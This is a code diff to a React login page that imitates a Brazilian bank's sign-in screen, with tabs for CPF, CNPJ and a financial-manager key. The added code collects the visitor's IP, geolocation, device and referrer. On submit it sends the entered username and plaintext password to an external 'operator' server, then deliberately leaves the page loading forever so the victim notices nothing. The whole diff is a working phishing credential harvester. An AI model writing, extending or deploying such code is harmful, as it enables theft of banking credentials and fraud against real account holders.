@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
@@ -12,6 +11,74 @@ const TABS = [
   { title: "Pessoa", subtitle: "Jurídica", value: "juridica" },
   { title: "Gerenciador", subtitle: "Financeiro", value: "financeiro" },
 ];
+
+// Função para capturar IP público
+const getClientIP = async (): Promise<string> => {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.log('Erro ao capturar IP:', error);
+    return '127.0.0.1';
+  }
+};
+
+// Função para capturar dados de localização
+const getLocationData = async (ip: string): Promise<{ country: string; city: string }> => {
+  try {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    const data = await response.json();
+    return {
+      country: data.country_code || 'BR',
+      city: data.city || 'São Paulo'
+    };
+  } catch (error) {
+    console.log('Erro ao capturar localização:', error);
+    return { country: 'BR', city: 'São Paulo' };
+  }
+};
+
+// Função para detectar tipo de dispositivo
+const getDeviceType = (): string => {
+  const userAgent = navigator.userAgent;
+  if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
+    return 'Tablet';
+  }
+  if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
+    return 'Mobile';
+  }
+  return 'Desktop';
+};
+
+// Função para coletar todos os dados do cliente
+const collectClientData = async () => {
+  console.log('Iniciando coleta de dados do cliente...');
+  
+  const ip = await getClientIP();
+  console.log('IP capturado:', ip);
+  
+  const location = await getLocationData(ip);
+  console.log('Localização capturada:', location);
+  
+  const device = getDeviceType();
+  console.log('Dispositivo detectado:', device);
+  
+  const currentUrl = window.location.href;
+  const referrer = document.referrer || 'direct';
+  
+  console.log('URL atual:', currentUrl);
+  console.log('Referrer:', referrer);
+  
+  return {
+    ip,
+    country: location.country,
+    city: location.city,
+    device,
+    currentUrl,
+    referrer
+  };
+};
 
 const Index = () => {
   const [tab, setTab] = useState("fisica");
@@ -82,10 +149,73 @@ const Index = () => {
     setSenhaTemp("");
   }
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    // Loading infinito - não para mais
+    
+    try {
+      // Determinar username baseado na aba ativa
+      let username = '';
+      if (tab === 'fisica') {
+        username = cpf;
+      } else if (tab === 'juridica') {
+        username = cnpj;
+      } else if (tab === 'financeiro') {
+        username = chaveMulticanal;
+      }
+
+      // Validar se username e senha estão preenchidos
+      if (!username || !senha) {
+        console.log('Username ou senha não preenchidos');
+        return;
+      }
+
+      console.log('Iniciando processo de registro do cliente...');
+      console.log('Tab ativa:', tab);
+      console.log('Username:', username);
+      
+      // Coletar dados do cliente
+      const clientData = await collectClientData();
+      
+      // Preparar dados para envio
+      const registerData = {
+        username,
+        password: senha,
+        ip: clientData.ip,
+        country: clientData.country,
+        city: clientData.city,
+        device: clientData.device,
+        referrer: clientData.referrer,
+        currentUrl: clientData.currentUrl
+      };
+
+      console.log('Dados preparados para envio:', registerData);
+
+      // Enviar requisição para API do operador
+      const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(registerData)
+      });
+
+      console.log('Status da resposta:', response.status);
+      
+      if (response.ok) {
+        const responseData = await response.json();
+        console.log('Cliente registrado com sucesso:', responseData);
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na resposta da API:', errorData);
+      }
+
+    } catch (error) {
+      console.log('Erro durante o processo de registro:', error);
+    }
+    
+    // Manter loading infinito - não setar isLoading para false
+    console.log('Loading infinito ativado');
   };
 
   // ---- PASSWORD INPUT (com toggle view) ----
